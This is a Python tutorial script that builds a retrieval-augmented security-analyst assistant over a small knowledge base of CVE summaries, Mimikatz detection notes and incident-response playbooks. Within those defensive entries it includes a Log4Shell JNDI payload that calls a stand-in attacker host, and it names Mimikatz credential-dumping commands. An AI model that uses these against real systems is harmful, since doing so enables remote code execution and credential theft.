# Stage 4 Milestone — Security Analyst Assistant
#
# A fully interactive RAG-based assistant that works with any LLM provider.
# Set ONE of:
#   set ANTHROPIC_API_KEY=...   (Claude)
#   set OPENAI_API_KEY=...      (OpenAI)
#   set GOOGLE_API_KEY=...      (Gemini)
#
# Run normally:      python milestone_security_assistant.py
# Interactive mode:  python milestone_security_assistant.py --interactive

import os
import sys
import numpy as np
from typing import List, Dict
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from llm_client import get_client

print("=" * 65)
print("  STAGE 4 MILESTONE: SECURITY ANALYST ASSISTANT")
print("=" * 65)

provider, client = get_client()

# ── Knowledge Base ────────────────────────────────────────────────────────────
KNOWLEDGE_BASE = {
    "CVE-2021-44228 (Log4Shell)": """
Apache Log4j2 (CVE-2021-44228) — Critical CVSS 10.0
Vulnerability: JNDI injection via log message contents.
Attack: ${jndi:ldap://attacker.com/x} in any logged field triggers remote class loading.
Products: Any Java app using Log4j2 2.0-beta9 through 2.14.1.
Fix: Upgrade to 2.17.1+. Mitigation: -Dlog4j2.formatMsgNoLookups=true.
Detection: Outbound LDAP from app servers. ${jndi: patterns in HTTP logs.
""",
    "CVE-2022-30190 (Follina)": """
Microsoft MSDT (CVE-2022-30190) — Critical CVSS 7.8
Vulnerability: Remote code execution via ms-msdt:// URI in Word documents.
Attack: Malicious .docx references ms-msdt:// URI, executes PowerShell. No macros required.
Products: Windows 10/11, Server 2016/2019/2022 with Office.
Fix: KB5014697 patch. Disable ms-msdt:// protocol as workaround.
Detection: msdt.exe spawned as child of Office processes.
""",
    "CVE-2023-44487 (HTTP/2 Rapid Reset)": """
HTTP/2 Rapid Reset DDoS (CVE-2023-44487) — High CVSS 7.5
Vulnerability: HTTP/2 stream cancellation causes server resource exhaustion.
Attack: RST_STREAM immediately after each request header bypasses rate limits.
Products: Nginx, Apache, .NET, Go HTTP/2 servers.
Fix: Nginx 1.25.3+. Rate limit stream resets.
Detection: High RESET_STREAM rates, CPU spike without traffic spike.
""",
    "Mimikatz & Credential Dumping": """
Mimikatz — Credential Dumping (MITRE T1003)
Extracts plaintext passwords, NTLM hashes, Kerberos tickets from LSASS memory.
Techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden.
Detection: LSASS access by non-system processes (Sysmon ID 10), unexpected lsass.dmp files,
domain replication from non-DC (Event ID 4662).
Mitigations: Credential Guard, disable WDigest, Protected Users group, EDR LSASS protection.
""",
    "Phishing Response Runbook": """
Phishing Incident Response
1. TRIAGE: Preserve original headers, extract IOCs (sender domain, links, attachment hashes).
2. CONTAINMENT: Block sender at email gateway, quarantine similar emails.
3. SCOPE: Search mail logs for all recipients of same campaign.
4. NOTIFICATION: Alert all recipients within 4 hours.
5. REMEDIATION: Reset credentials if opened, scan endpoint.
Time targets: Triage <15 min, Containment <1 hr, Notification <4 hr.
""",
    "MITRE ATT&CK Quick Reference": """
Common MITRE ATT&CK Techniques:
T1190 - Exploit Public-Facing Application
T1059.001 - PowerShell execution
T1003 - OS Credential Dumping (Mimikatz)
T1021.002 - SMB/Windows Admin Shares (lateral movement)
T1078 - Valid Accounts (credential misuse)
T1486 - Data Encrypted for Impact (ransomware)
T1566 - Phishing (initial access)
T1071 - C2 over HTTP/HTTPS/DNS
T1027 - Obfuscated Files (base64, packing)
T1053 - Scheduled Task (persistence)
T1110 - Brute Force
""",
    "Ransomware Response Playbook": """
Ransomware Incident Response
Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. Do NOT reboot.
Phase 2 (30 min-2 hr): Isolate via VLAN, disable accounts, block C2 IPs/domains at perimeter.
Phase 3 (2-24 hr): Remove ransomware, reset all credentials, patch initial access vector.
Phase 4 (1-7 days): Restore from verified clean backups, prioritise critical systems.
Phase 5: Root cause analysis, update detection rules, test backup restoration.
""",
}


# ── RAG Engine ────────────────────────────────────────────────────────────────
class RAGEngine:
    def __init__(self, docs: Dict[str, str]):
        self.chunks: List[str] = []
        self.sources: List[str] = []
        for name, text in docs.items():
            words = text.split()
            for i in range(0, len(words), 100):
                chunk = ' '.join(words[i:i + 120])
                if len(chunk.split()) > 20:
                    self.chunks.append(chunk)
                    self.sources.append(name)
        self._build_index()

    def _build_index(self):
        try:
            from sentence_transformers import SentenceTransformer
            self._model = SentenceTransformer('all-MiniLM-L6-v2')
            self._embeddings = self._model.encode(self.chunks)
            self._embed = lambda t: self._model.encode([t])[0]
            print(f"Indexed {len(self.chunks)} chunks (sentence-transformers)")
        except ImportError:
            from sklearn.feature_extraction.text import TfidfVectorizer
            self._tfidf = TfidfVectorizer(stop_words='english', ngram_range=(1, 2))
            self._embeddings = self._tfidf.fit_transform(self.chunks).toarray()
            self._embed = lambda t: self._tfidf.transform([t]).toarray()[0]
            print(f"Indexed {len(self.chunks)} chunks (TF-IDF fallback)")

    def retrieve(self, query: str, k: int = 4) -> List[Dict]:
        q = self._embed(query)
        scores = [np.dot(q, e) / (np.linalg.norm(q) * np.linalg.norm(e) + 1e-8)
                  for e in self._embeddings]
        top = sorted(enumerate(scores), key=lambda x: x[1], reverse=True)[:k]
        return [{'text': self.chunks[i], 'source': self.sources[i], 'score': s}
                for i, s in top if s > 0.05]


# ── Assistant ─────────────────────────────────────────────────────────────────
class SecurityAssistant:
    SYSTEM = """You are an expert cybersecurity analyst assistant.
Answer questions ONLY based on the provided context documents.
If information is not in the context, say so — do not hallucinate.
Format answers clearly with bullet points where appropriate.
Always cite which document your answer comes from."""

    def __init__(self):
        self.rag = RAGEngine(KNOWLEDGE_BASE)
        self.history: List[Dict] = []

    def ask(self, question: str) -> str:
        retrieved = self.rag.retrieve(question, k=4)
        if not retrieved:
            return "I couldn't find relevant information in the knowledge base."

        context = "\n\n".join([f"[{r['source']}]\n{r['text']}" for r in retrieved])
        user_msg = f"Context:\n{context}\n\nQuestion: {question}"
        self.history.append({"role": "user", "content": user_msg})

        if client is None:
            answer = (f"[No API key set]\n"
                      f"Retrieved from: {', '.join(set(r['source'] for r in retrieved))}\n"
                      f"Top chunk: {retrieved[0]['text'][:200]}...")
        else:
            answer = client.chat(
                system=self.SYSTEM,
                messages=self.history[-6:],
                max_tokens=600,
            )
        self.history.append({"role": "assistant", "content": answer})
        return answer


# ── Demo & Interactive modes ──────────────────────────────────────────────────
def run_demo(assistant: SecurityAssistant):
    questions = [
        "What is Log4Shell and how does it work?",
        "How do I detect if Log4Shell was exploited on my servers?",
        "What MITRE ATT&CK technique covers ransomware encryption?",
        "Walk me through the first steps of responding to a phishing incident.",
        "What is CVE-2023-44487 and how do I detect it?",
    ]
    for q in questions:
        print(f"\n{'─'*60}\nQ: {q}")
        print(f"\nA: {assistant.ask(q)}")


def run_interactive(assistant: SecurityAssistant):
    print(f"\nInteractive mode (provider: {provider})")
    print("Commands: /quit to exit\n")
    while True:
        try:
            question = input("You: ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not question:
            continue
        if question.lower() in ('/quit', 'exit', 'quit'):
            break
        print(f"\nAssistant: {assistant.ask(question)}\n")


# ── Entry point ────────────────────────────────────────────────────────────────
assistant = SecurityAssistant()

if len(sys.argv) > 1 and sys.argv[1] == '--interactive':
    run_interactive(assistant)
else:
    run_demo(assistant)
    print("\n" + "=" * 65)
    print("  MILESTONE COMPLETE")
    print("=" * 65)
    print("\nTo run interactively:")
    print("  python milestone_security_assistant.py --interactive")
    print("\nTo add your own documents:")
    print("  Add entries to the KNOWLEDGE_BASE dict at the top of this file.")
